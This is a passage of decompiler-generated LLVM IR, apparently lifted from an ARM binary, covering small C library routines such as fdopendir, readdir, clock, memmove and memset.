  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_10f3c, label %dec_label_pc_10f24

dec_label_pc_10f24:                               ; preds = %entry
  %v0_10f28 = call i32 @__aeabi_read_tp()
  %v3_10f2c = load i16, i16* @global_var_216ec.303, align 2
  %v4_10f2c = sext i16 %v3_10f2c to i32
  %v0_10f30 = load i32, i32* %r2.global-to-local, align 4
  %v1_10f30 = sub i32 0, %v0_10f30
  store i32 %v1_10f30, i32* %r2.global-to-local, align 4
  %v3_10f34 = add i32 %v4_10f2c, %v0_10f28
  %v4_10f34 = inttoptr i32 %v3_10f34 to i32*
  store i32 %v1_10f30, i32* %v4_10f34, align 4
  br label %dec_label_pc_10f60

dec_label_pc_10f3c:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_10f3c = icmp slt i32 %arg1, 0
  br i1 %v1_10f3c, label %dec_label_pc_10f60, label %dec_label_pc_10f44

dec_label_pc_10f44:                               ; preds = %dec_label_pc_10f3c
  store i32 %v2_10f0c, i32* @r1, align 4
  %v0_10f48 = call i32 @fstat()
  %v1_10f4c = icmp slt i32 %v0_10f48, 0
  br i1 %v1_10f4c, label %dec_label_pc_10f54, label %dec_label_pc_10f68

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f44
  br label %dec_label_pc_10f60

dec_label_pc_10f60:                               ; preds = %dec_label_pc_10f54, %dec_label_pc_10f3c, %dec_label_pc_10f24
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10fac

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10f44
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_10f70 = load i32, i32* @r7, align 4
  %v3_10f74 = call i32 @__GI___fcntl_nocancel(i32 %v0_10f70, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_10f7c = load i32, i32* @r7, align 4
  %v2_10f80 = call i32 @fd_to_DIR(i32 %v0_10f7c, i32 %tmp)
  store i32 %v2_10f80, i32* %r1.global-to-local, align 4
  %v2_10f84 = icmp eq i32 %v2_10f80, 0
  br i1 %v2_10f84, label %dec_label_pc_10f8c, label %dec_label_pc_10fac

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f68
  %v0_10f9c = call i32 @__aeabi_read_tp()
  %v3_10fa0 = load i16, i16* @global_var_216ec.303, align 2
  %v4_10fa0 = sext i16 %v3_10fa0 to i32
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_10fa8 = add i32 %v4_10fa0, %v0_10f9c
  %v4_10fa8 = inttoptr i32 %v3_10fa8 to i32*
  store i32 12, i32* %v4_10fa8, align 4
  %v0_10fac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10fac

dec_label_pc_10fac:                               ; preds = %dec_label_pc_10f68, %dec_label_pc_10f60, %dec_label_pc_10f8c
  %v0_10fac = phi i32 [ %v2_10f80, %dec_label_pc_10f68 ], [ 0, %dec_label_pc_10f60 ], [ %v0_10fac.pre, %dec_label_pc_10f8c ]
  store i32 %v3_10f04, i32* @r7, align 4
  ret i32 %v0_10fac

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10fac, { 2, 0, 1 }
}

define i32 @"$d.8"(i16 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10fbc:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i16 %arg1 to i32
  %v0_10fbc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10fbc, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_10fbc
  %v1_10fbc = load i32, i32* @r8, align 4
  %v5_10fbc = mul i32 %tmp, 65536
  %v6_10fbc = and i32 %v1_10fbc, %v5_10fbc
  store i32 %v6_10fbc, i32* %r4.global-to-local, align 4
  %v4_10fc0 = inttoptr i32 %arg2 to i16*
  store i16 %arg1, i16* %v4_10fc0, align 2
  %v5_10fc0 = load i32, i32* @r8, align 4
  %v6_10fc0 = load i32, i32* %r1.global-to-local, align 4
  %v7_10fc0 = sub i32 %v6_10fc0, %v5_10fc0
  store i32 %v7_10fc0, i32* %r1.global-to-local, align 4
  %v2_10fc4 = load i32, i32* %r4.global-to-local, align 4
  %v5_10fc4 = sdiv i32 %v2_10fc4, 16384
  %v6_10fc4 = and i32 %v5_10fc4, %v7_10fc0
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10fbc, %bb
  %v7_10fc4 = phi i32 [ %tmp, %dec_label_pc_10fbc ], [ %v6_10fc4, %bb ]
  ret i32 %v7_10fc4

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @fdopendir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_10fcc = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10fcc, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_10fd8 = call i32 @fstat()
  store i32 %v0_10fd8, i32* @r5, align 4
  %v2_10fdc = icmp eq i32 %v0_10fd8, 0
  br i1 %v2_10fdc, label %dec_label_pc_10fe4, label %dec_label_pc_1105c

dec_label_pc_10fe4:                               ; preds = %entry
  %v1_10fe8 = and i32 %tmp4, ptrtoint (i32* @global_var_f000.340 to i32)
  store i32 %v1_10fe8, i32* @r3, align 4
  %v7_10fec = icmp eq i32 %v1_10fe8, 16384
  br i1 %v7_10fec, label %dec_label_pc_1100c, label %dec_label_pc_10ff4

dec_label_pc_10ff4:                               ; preds = %dec_label_pc_10fe4
  %v0_10ff8 = call i32 @__aeabi_read_tp()
  %v3_10ffc = load i16, i16* @global_var_216ec.303, align 2
  %v0_11000 = load i32, i32* @r5, align 4
  store i32 %v0_11000, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11040

dec_label_pc_1100c:                               ; preds = %dec_label_pc_10fe4
  %v0_1100c = load i32, i32* @r4, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_11014 = call i32 @__libc_fcntl(i32 %v0_1100c, i32 3)
  %v7_11018 = icmp eq i32 %v2_11014, -1
  br i1 %v7_11018, label %dec_label_pc_1105c, label %dec_label_pc_11020

dec_label_pc_11020:                               ; preds = %dec_label_pc_1100c
  %v1_11020 = urem i32 %v2_11014, 4
  store i32 %v1_11020, i32* %r3.global-to-local, align 4
  %v7_11024 = icmp eq i32 %v1_11020, 1
  br i1 %v7_11024, label %dec_label_pc_1102c, label %dec_label_pc_11048

dec_label_pc_1102c:                               ; preds = %dec_label_pc_11020
  %v0_11030 = call i32 @__aeabi_read_tp()
  %v3_11034 = load i16, i16* @global_var_216ec.303, align 2
  %v0_11038 = load i32, i32* @r5, align 4
  store i32 %v0_11038, i32* %r1.global-to-local, align 4
  %v0_1103c = load i32, i32* %r3.global-to-local, align 4
  %v1_1103c = add i32 %v0_1103c, 21
  br label %dec_label_pc_11040

dec_label_pc_11040:                               ; preds = %dec_label_pc_10ff4, %dec_label_pc_1102c
  %v2_11040.in = phi i16 [ %v3_10ffc, %dec_label_pc_10ff4 ], [ %v3_11034, %dec_label_pc_1102c ]
  %v1_11040 = phi i32 [ %v0_10ff8, %dec_label_pc_10ff4 ], [ %v0_11030, %dec_label_pc_1102c ]
  %storemerge = phi i32 [ 20, %dec_label_pc_10ff4 ], [ %v1_1103c, %dec_label_pc_1102c ]
  %v2_11040 = sext i16 %v2_11040.in to i32
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v3_11040 = add i32 %v1_11040, %v2_11040
  %v4_11040 = inttoptr i32 %v3_11040 to i32*
  store i32 %storemerge, i32* %v4_11040, align 4
  %v0_11060.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11060

dec_label_pc_11048:                               ; preds = %dec_label_pc_11020
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_1104c = load i32, i32* @r4, align 4
  %v2_11050 = call i32 @fd_to_DIR(i32 %v0_1104c, i32 %tmp)
  store i32 %v2_11050, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11060

dec_label_pc_1105c:                               ; preds = %entry, %dec_label_pc_1100c
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11060

dec_label_pc_11060:                               ; preds = %dec_label_pc_11048, %dec_label_pc_11040, %dec_label_pc_1105c
  %v0_11060 = phi i32 [ %v2_11050, %dec_label_pc_11048 ], [ %v0_11060.pre, %dec_label_pc_11040 ], [ 0, %dec_label_pc_1105c ]
  ret i32 %v0_11060

; uselistorder directives
  uselistorder i32 %v1_11020, { 1, 0 }
  uselistorder i32 %v2_11014, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder i32 (i32, i32)* @fd_to_DIR, { 1, 0 }
  uselistorder i32 21, { 6, 1, 0, 7, 5, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 ()* @fstat, { 1, 0 }
  uselistorder label %dec_label_pc_11060, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1105c, { 1, 0 }
  uselistorder label %dec_label_pc_11040, { 1, 0 }
}

define i32 @__GI_readdir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_11078 = load i32, i32* @r4, align 4
  %v6_11078 = load i32, i32* @r5, align 4
  %v9_11078 = load i32, i32* @r6, align 4
  %v12_11078 = load i32, i32* @r7, align 4
  %v15_11078 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r6, align 4
  %v1_1108c = add i32 %tmp, 24
  store i32 %v1_1108c, i32* @r4, align 4
  %v4_11090 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 68) to i32*), align 4
  store i32 %v4_11090, i32* %r1.global-to-local, align 4
  store i32 %v1_1108c, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_110a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_110a4)
  %v0_110b8 = load i32, i32* @r6, align 4
  %v2_110b8 = add i32 %v0_110b8, 16
  %v3_110b8 = inttoptr i32 %v2_110b8 to i32*
  %v4_110b8 = load i32, i32* %v3_110b8, align 4
  store i32 %v4_110b8, i32* @ip, align 4
  store i32 69828, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_110b8)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_110c8

dec_label_pc_110c8:                               ; preds = %dec_label_pc_110f8, %entry
  %v0_110c8 = load i32, i32* @r5, align 4
  %v1_110c8 = add i32 %v0_110c8, 4
  %v2_110c8 = inttoptr i32 %v1_110c8 to i32*
  %v3_110c8 = load i32, i32* %v2_110c8, align 4
  store i32 %v3_110c8, i32* %r2.global-to-local, align 4
  %v4_110c8 = add i32 %v0_110c8, 8
  %v5_110c8 = inttoptr i32 %v4_110c8 to i32*
  %v6_110c8 = load i32, i32* %v5_110c8, align 4
  %tmp10 = icmp ugt i32 %v6_110c8, %v3_110c8
  br i1 %tmp10, label %dec_label_pc_110f8, label %dec_label_pc_110d4

dec_label_pc_110d4:                               ; preds = %dec_label_pc_110c8
  %v1_110d4 = inttoptr i32 %v0_110c8 to i32*
  %v2_110d4 = load i32, i32* %v1_110d4, align 4
  %v1_110d8 = add i32 %v0_110c8, 12
  %v2_110d8 = inttoptr i32 %v1_110d8 to i32*
  %v3_110d8 = load i32, i32* %v2_110d8, align 4
  store i32 %v3_110d8, i32* %r1.global-to-local, align 4
  %v1_110dc = add i32 %v0_110c8, 20
  %v2_110dc = inttoptr i32 %v1_110dc to i32*
  %v3_110dc = load i32, i32* %v2_110dc, align 4
  store i32 %v3_110dc, i32* %r2.global-to-local, align 4
  %v4_110e0 = call i32 @__getdents(i32 %v2_110d4, i32 %v3_110d8, i32 %v3_110dc, i32 %v6_110c8)
  %tmp9 = icmp slt i32 %v4_110e0, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_110f0

.thread:                                          ; preds = %dec_label_pc_110d4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11124

dec_label_pc_110f0:                               ; preds = %dec_label_pc_110d4
  %v1_110f0 = load i32, i32* @r5, align 4
  %v2_110f0 = add i32 %v1_110f0, 8
  %v3_110f0 = inttoptr i32 %v2_110f0 to i32*
  store i32 %v4_110e0, i32* %v3_110f0, align 4
  %v0_110f4 = load i32, i32* @r7, align 4
  %v1_110f4 = load i32, i32* @r5, align 4
  %v2_110f4 = add i32 %v1_110f4, 4
  %v3_110f4 = inttoptr i32 %v2_110f4 to i32*
  store i32 %v0_110f4, i32* %v3_110f4, align 4
  %v0_110f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_110f8

dec_label_pc_110f8:                               ; preds = %dec_label_pc_110c8, %dec_label_pc_110f0
  %v1_11108 = phi i32 [ %v0_110c8, %dec_label_pc_110c8 ], [ %v0_110f8.pre, %dec_label_pc_110f0 ]
  %v1_110f8 = add i32 %v1_11108, 4
  %v2_110f8 = inttoptr i32 %v1_110f8 to i32*
  %v3_110f8 = load i32, i32* %v2_110f8, align 4
  store i32 %v3_110f8, i32* %r2.global-to-local, align 4
  %v1_110fc = add i32 %v1_11108, 12
  %v2_110fc = inttoptr i32 %v1_110fc to i32*
  %v3_110fc = load i32, i32* %v2_110fc, align 4
  store i32 %v3_110fc, i32* %r1.global-to-local, align 4
  %v2_11100 = add i32 %v3_110fc, %v3_110f8
  store i32 %v2_11100, i32* @r4, align 4
  %v1_11104 = add i32 %v2_11100, 4
  %v2_11104 = inttoptr i32 %v1_11104 to i32*
  %v3_11104 = load i32, i32* %v2_11104, align 4
  %v2_11108 = add i32 %v1_11108, 16
  %v3_11108 = inttoptr i32 %v2_11108 to i32*
  store i32 %v3_11104, i32* %v3_11108, align 4
  %v0_1110c = load i32, i32* @r4, align 4
  %v1_1110c = add i32 %v0_1110c, 8
  %v2_1110c = inttoptr i32 %v1_1110c to i16*
  %v3_1110c = load i16, i16* %v2_1110c, align 2
  %v4_1110c = zext i16 %v3_1110c to i32
  %v0_11110 = load i32, i32* %r2.global-to-local, align 4
  %v1_11110 = load i32, i32* %r1.global-to-local, align 4
  %v2_11110 = add i32 %v1_11110, %v0_11110
  %v3_11110 = inttoptr i32 %v2_11110 to i32*
  %v4_11110 = load i32, i32* %v3_11110, align 4
  store i32 %v4_11110, i32* %r1.global-to-local, align 4
  %v2_11114 = add i32 %v0_11110, %v4_1110c
  %v2_11118 = icmp eq i32 %v4_11110, 0
  %v1_1111c = load i32, i32* @r5, align 4
  %v2_1111c = add i32 %v1_1111c, 4
  %v3_1111c = inttoptr i32 %v2_1111c to i32*
  store i32 %v2_11114, i32* %v3_1111c, align 4
  br i1 %v2_11118, label %dec_label_pc_110c8, label %dec_label_pc_11124

dec_label_pc_11124:                               ; preds = %dec_label_pc_110f8, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_11130 = load i32, i32* @r6, align 4
  %v2_11130 = add i32 %v0_11130, 44
  %v3_11130 = inttoptr i32 %v2_11130 to i32*
  %v4_11130 = load i32, i32* %v3_11130, align 4
  call void @__pseudo_branch(i32 %v4_11130)
  %v0_1113c = load i32, i32* @r4, align 4
  store i32 %v3_11078, i32* @r4, align 4
  store i32 %v6_11078, i32* @r5, align 4
  store i32 %v9_11078, i32* @r6, align 4
  store i32 %v12_11078, i32* @r7, align 4
  store i32 %v15_11078, i32* @lr, align 4
  ret i32 %v0_1113c

; uselistorder directives
  uselistorder i32 %v1_11108, { 0, 2, 1 }
  uselistorder i32 %v6_110c8, { 1, 0 }
  uselistorder i32 %v0_110c8, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_110f8, { 1, 0 }
}

define i32 @function_11150(i32 %arg1) local_unnamed_addr {
dec_label_pc_11150:
  %v0_11150 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11150, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11150
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11150, %bb
  %v4_1115c = phi i32 [ %arg1, %dec_label_pc_11150 ], [ 0, %bb ]
  ret i32 %v4_1115c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_11160 = load i32, i32* @lr, align 4
  %v0_11168 = call i32 @__aeabi_read_tp()
  %v3_1116c = load i16, i16* @global_var_216ec.303, align 2
  %v4_1116c = sext i16 %v3_1116c to i32
  %v2_11170 = add i32 %v4_1116c, %v0_11168
  store i32 %v0_11160, i32* @lr, align 4
  ret i32 %v2_11170
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_11184 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11184, i32* @r0, align 4
  %v1_1118c = call i32 @times(i32 %v2_11184)
  %v2_11190 = load i32, i32* %stack_var_-24, align 4
  %v2_11194 = add i32 %v2_11190, %tmp
  %v2_1119c = mul i32 %v2_11194, 10000
  %v1_111a0 = and i32 %v2_1119c, 2147483632
  ret i32 %v1_111a0

; uselistorder directives
  uselistorder i32 %v2_11184, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_111c0 = call i32 @_memcpy()
  ret i32 %v0_111c0
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_111d0 = call i32 @_memcpy()
  ret i32 %v0_111d0

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_111e4 = icmp eq i32 %arg3, 8
  store i1 %v8_111e4, i1* %cpsr_z.global-to-local, align 1
  %v5_111e8 = icmp slt i32 %arg3, 8
  br i1 %v5_111e8, label %dec_label_pc_11248, label %dec_label_pc_111ec

dec_label_pc_111ec:                               ; preds = %entry
  %v4_111ec = mul i32 %arg2, 256
  %v5_111ec = or i32 %v4_111ec, %arg2
  %v4_111f0 = mul i32 %v5_111ec, 65536
  %v5_111f0 = or i32 %v4_111f0, %v5_111ec
  store i32 %v5_111f0, i32* @r1, align 4
  %v1_111f457 = urem i32 %tmp, 4
  %v2_111f458 = icmp eq i32 %v1_111f457, 0
  store i1 %v2_111f458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_111f458, label %dec_label_pc_11204, label %bb

bb:                                               ; preds = %dec_label_pc_111ec, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_111ec ]
  %v3_111f859 = phi i32 [ %v6_111f8, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_111ec ]
  %v4_111f8 = inttoptr i32 %v3_111f859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_111f8, align 1
  %v5_111f8 = load i32, i32* @r3, align 4
  %v6_111f8 = add i32 %v5_111f8, 1
  store i32 %v6_111f8, i32* @r3, align 4
  %v0_111fc.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_11208.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_111fc.pr, label %dec_label_pc_11204, label %.thread

.thread:                                          ; preds = %bb
  %v2_111fc = add i32 %v0_11208.pr.pre, -1
  store i32 %v2_111fc, i32* %r2.global-to-local, align 4
  %v1_111f4 = urem i32 %v6_111f8, 4
  %v2_111f4 = icmp eq i32 %v1_111f4, 0
  store i1 %v2_111f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_111f4, label %dec_label_pc_11204, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_111f8.pre = load i32, i32* @r1, align 4
  %extract.t82 = trunc i32 %v1_111f8.pre to i8
  br label %bb

dec_label_pc_11204:                               ; preds = %.thread, %bb, %dec_label_pc_111ec
  %v0_1121028 = phi i32 [ %tmp, %dec_label_pc_111ec ], [ %v6_111f8, %bb ], [ %v6_111f8, %.thread ]
  %v0_11208.pr = phi i32 [ %arg3, %dec_label_pc_111ec ], [ %v0_11208.pr.pre, %bb ], [ %v2_111fc, %.thread ]
  %v0_11204 = load i32, i32* @r1, align 4
  store i32 %v0_11204, i32* %ip.global-to-local, align 4
  %v8_1120810 = icmp eq i32 %v0_11208.pr, 8
  store i1 %v8_1120810, i1* %cpsr_z.global-to-local, align 1
  %v5_1120c11 = icmp slt i32 %v0_11208.pr, 8
  br i1 %v5_1120c11, label %dec_label_pc_11248, label %dec_label_pc_11210.preheader

dec_label_pc_11210.preheader:                     ; preds = %dec_label_pc_11204
  %v1_1121046 = inttoptr i32 %v0_1121028 to i32*
  store i32 %v0_11204, i32* %v1_1121046, align 4
  %v3_1121047 = add i32 %v0_1121028, 4
  %v4_1121048 = inttoptr i32 %v3_1121047 to i32*
  %v5_1121049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1121049, i32* %v4_1121048, align 4
  %v6_1121050 = add i32 %v0_1121028, 8
  store i32 %v6_1121050, i32* @r3, align 4
  %v0_1121451 = load i32, i32* %r2.global-to-local, align 4
  %v1_1121452 = add i32 %v0_1121451, -8
  store i32 %v1_1121452, i32* %r2.global-to-local, align 4
  %v5_1121c53 = icmp slt i32 %v1_1121452, 8
  br i1 %v5_1121c53, label %dec_label_pc_11210.dec_label_pc_11248.loopexit_crit_edge, label %dec_label_pc_11220

dec_label_pc_11220:                               ; preds = %dec_label_pc_11210.preheader, %dec_label_pc_11208.dec_label_pc_11210_crit_edge
  %v6_1121055 = phi i32 [ %v6_11210, %dec_label_pc_11208.dec_label_pc_11210_crit_edge ], [ %v6_1121050, %dec_label_pc_11210.preheader ]
  %v0_1121054 = phi i32 [ %v12_1123c, %dec_label_pc_11208.dec_label_pc_11210_crit_edge ], [ %v0_1121028, %dec_label_pc_11210.preheader ]
  %v1_11220 = inttoptr i32 %v6_1121055 to i32*
  %v2_11220 = load i32, i32* @r1, align 4
  store i32 %v2_11220, i32* %v1_11220, align 4
  %v3_11220 = add i32 %v0_1121054, 12
  %v4_11220 = inttoptr i32 %v3_11220 to i32*
  %v5_11220 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11220, i32* %v4_11220, align 4
  %v6_11220 = add i32 %v0_1121054, 16
  store i32 %v6_11220, i32* @r3, align 4
  %v0_11224 = load i32, i32* %r2.global-to-local, align 4
  %v1_11224 = add i32 %v0_11224, -8
  store i32 %v1_11224, i32* %r2.global-to-local, align 4
  %v5_1122c = icmp slt i32 %v1_11224, 8
  br i1 %v5_1122c, label %dec_label_pc_11220.dec_label_pc_11248.loopexit_crit_edge, label %dec_label_pc_11230

dec_label_pc_11230:                               ; preds = %dec_label_pc_11220
  %v1_11230 = inttoptr i32 %v6_11220 to i32*
  %v2_11230 = load i32, i32* @r1, align 4
  store i32 %v2_11230, i32* %v1_11230, align 4
  %v3_11230 = add i32 %v0_1121054, 20
  %v4_11230 = inttoptr i32 %v3_11230 to i32*
  %v5_11230 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11230, i32* %v4_11230, align 4
  %v6_11230 = add i32 %v0_1121054, 24
  store i32 %v6_11230, i32* @r3, align 4
  %v0_11234 = load i32, i32* %r2.global-to-local, align 4
  %v1_11234 = add i32 %v0_11234, -8
  store i32 %v1_11234, i32* %r2.global-to-local, align 4
  %v5_1123c = icmp slt i32 %v1_11234, 8
  br i1 %v5_1123c, label %dec_label_pc_11230.dec_label_pc_11248.loopexit_crit_edge, label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %dec_label_pc_11230
  %v7_1123c = inttoptr i32 %v6_11230 to i32*
  %v8_1123c = load i32, i32* @r1, align 4
  store i32 %v8_1123c, i32* %v7_1123c, align 4
  %v9_1123c = add i32 %v0_1121054, 28
  %v10_1123c = inttoptr i32 %v9_1123c to i32*
  %v11_1123c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1123c, i32* %v10_1123c, align 4
  %v12_1123c = add i32 %v0_1121054, 32
  store i32 %v12_1123c, i32* @r3, align 4
  %v6_11240 = load i32, i32* %r2.global-to-local, align 4
  %v7_11240 = add i32 %v6_11240, -8
  store i32 %v7_11240, i32* %r2.global-to-local, align 4
  %v5_1120c = icmp slt i32 %v7_11240, 8
  br i1 %v5_1120c, label %dec_label_pc_11208.dec_label_pc_11248.loopexit_crit_edge, label %dec_label_pc_11208.dec_label_pc_11210_crit_edge

dec_label_pc_11208.dec_label_pc_11210_crit_edge:  ; preds = %dec_label_pc_11208
  %v2_11210.pre = load i32, i32* @r1, align 4
  %v1_11210 = inttoptr i32 %v12_1123c to i32*
  store i32 %v2_11210.pre, i32* %v1_11210, align 4
  %v3_11210 = add i32 %v0_1121054, 36
  %v4_11210 = inttoptr i32 %v3_11210 to i32*
  %v5_11210 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_11210, i32* %v4_11210, align 4
  %v6_11210 = add i32 %v0_1121054, 40
  store i32 %v6_11210, i32* @r3, align 4
  %v0_11214 = load i32, i32* %r2.global-to-local, align 4
  %v1_11214 = add i32 %v0_11214, -8
  store i32 %v1_11214, i32* %r2.global-to-local, align 4
  %v5_1121c = icmp slt i32 %v1_11214, 8
  br i1 %v5_1121c, label %dec_label_pc_11210.dec_label_pc_11248.loopexit_crit_edge, label %dec_label_pc_11220

dec_label_pc_11208.dec_label_pc_11248.loopexit_crit_edge: ; preds = %dec_label_pc_11208
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11248

dec_label_pc_11210.dec_label_pc_11248.loopexit_crit_edge: ; preds = %dec_label_pc_11208.dec_label_pc_11210_crit_edge, %dec_label_pc_11210.preheader
  %v1_11214.lcssa = phi i32 [ %v1_1121452, %dec_label_pc_11210.preheader ], [ %v1_11214, %dec_label_pc_11208.dec_label_pc_11210_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11248

dec_label_pc_11220.dec_label_pc_11248.loopexit_crit_edge: ; preds = %dec_label_pc_11220
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11248

dec_label_pc_11230.dec_label_pc_11248.loopexit_crit_edge: ; preds = %dec_label_pc_11230
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11248

dec_label_pc_11248:                               ; preds = %dec_label_pc_11204, %dec_label_pc_11208.dec_label_pc_11248.loopexit_crit_edge, %dec_label_pc_11210.dec_label_pc_11248.loopexit_crit_edge, %dec_label_pc_11220.dec_label_pc_11248.loopexit_crit_edge, %dec_label_pc_11230.dec_label_pc_11248.loopexit_crit_edge, %entry
  %v0_11250 = phi i32 [ %arg3, %entry ], [ %v1_11234, %dec_label_pc_11230.dec_label_pc_11248.loopexit_crit_edge ], [ %v1_11224, %dec_label_pc_11220.dec_label_pc_11248.loopexit_crit_edge ], [ %v1_11214.lcssa, %dec_label_pc_11210.dec_label_pc_11248.loopexit_crit_edge ], [ %v7_11240, %dec_label_pc_11208.dec_label_pc_11248.loopexit_crit_edge ], [ %v0_11208.pr, %dec_label_pc_11204 ]
  %v2_11248 = icmp eq i32 %v0_11250, 0
  store i1 %v2_11248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11248, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_11248
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_11248
  %v1_11250 = sub i32 7, %v0_11250
  store i32 %v1_11250, i32* %r2.global-to-local, align 4
  %v3_11254 = mul i32 %v1_11250, 4
  %v4_11254 = add i32 %v3_11254, ptrtoint (i32* @global_var_1125c.350 to i32)
  call void @__pseudo_branch(i32 %v4_11254)
  %v0_1125c = load i32, i32* @r1, align 4
  %v1_1125c = trunc i32 %v0_1125c to i8
  %v2_1125c = load i32, i32* @r3, align 4
  %v3_1125c = inttoptr i32 %v2_1125c to i8*
  store i8 %v1_1125c, i8* %v3_1125c, align 1
  %v4_1125c = load i32, i32* @r3, align 4
  %v5_1125c = add i32 %v4_1125c, 1
  store i32 %v5_1125c, i32* %r3.global-to-local, align 4
  %v0_11260 = load i32, i32* @r1, align 4
  %v1_11260 = trunc i32 %v0_11260 to i8
  %v3_11260 = inttoptr i32 %v5_1125c to i8*
